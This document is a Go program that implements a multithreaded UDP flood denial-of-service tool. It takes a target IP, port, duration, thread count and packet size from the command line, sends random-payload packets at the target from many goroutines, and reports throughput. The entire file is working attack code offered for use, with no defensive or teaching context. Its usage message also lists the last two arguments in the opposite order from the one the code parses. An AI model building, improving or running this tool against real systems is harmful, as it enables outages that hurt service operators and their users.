package main

import (
	"fmt"
	"math/rand"
	"net"
	"os"
	"os/signal"
	"strconv"
	"sync"
	"syscall"
	"time"
)

type AttackParams struct {
	targetIP   string
	targetPort int
	duration   int
	packetSize int
	threadID   int
}

var keepRunning = true
var totalDataSent int64
var mu sync.Mutex

func handleSignal(signal os.Signal) {
	keepRunning = false
}


func generateRandomPayload(size int) []byte {
	payload := make([]byte, size)
	for i := 0; i < size; i++ {
		payload[i] = byte(rand.Intn(256))
	}
	return payload
}

func networkMonitor() {
	for keepRunning {
		time.Sleep(1 * time.Second)
		mu.Lock()
		dataSentInMB := float64(totalDataSent) / (1024.0 * 1024.0)
		mu.Unlock()
		fmt.Printf("Total data sent so far: %.2f MB\n", dataSentInMB) 
	}
}

func udpFlood(params AttackParams) {

	serverAddr, err := net.ResolveUDPAddr("udp", fmt.Sprintf("%s:%d", params.targetIP, params.targetPort))
	if err != nil {
		fmt.Println("Invalid IP address.")
		return
	}

	conn, err := net.DialUDP("udp", nil, serverAddr)
	if err != nil {
		fmt.Println("Socket creation failed:", err)
		return
	}
	defer conn.Close()

	message := generateRandomPayload(params.packetSize)


	endTime := time.Now().Add(time.Duration(params.duration) * time.Second)
	for time.Now().Before(endTime) && keepRunning {
		_, err := conn.Write(message)
		if err != nil {
			fmt.Println("Failed to send packet:", err)
			return
		}

		mu.Lock()
		totalDataSent += int64(params.packetSize)
		mu.Unlock()
	}
}

func main() {

	if len(os.Args) != 6 {
		fmt.Printf("Usage: %s [IP] [PORT] [TIME] [THREADS] [PACKET_SIZE]\n", os.Args[0])
		os.Exit(1)
	}


	targetIP := os.Args[1]
	targetPort, _ := strconv.Atoi(os.Args[2])
	duration, _ := strconv.Atoi(os.Args[3])
	packetSize, _ := strconv.Atoi(os.Args[4])
	threadCount, _ := strconv.Atoi(os.Args[5])

	if packetSize <= 0 || threadCount <= 0 {
		fmt.Println("Invalid packet size or thread count.")
		os.Exit(1)
	}


	signal.Notify(make(chan os.Signal, 1), syscall.SIGINT)
	go func() {
		signalChan := make(chan os.Signal, 1)
		signal.Notify(signalChan, syscall.SIGINT)
		<-signalChan
		handleSignal(syscall.SIGINT)
	}()


	params := make([]AttackParams, threadCount)
	for i := 0; i < threadCount; i++ {
		params[i] = AttackParams{
			targetIP:   targetIP,
			targetPort: targetPort,
			duration:   duration,
			packetSize: packetSize,
			threadID:   i,
		}
	}


	var wg sync.WaitGroup

	go networkMonitor()


	for i := 0; i < threadCount; i++ {
		wg.Add(1)
		go func(i int) {
			defer wg.Done()
			udpFlood(params[i])
		}(i)
	}


	wg.Wait()

	fmt.Println("Finished")
}
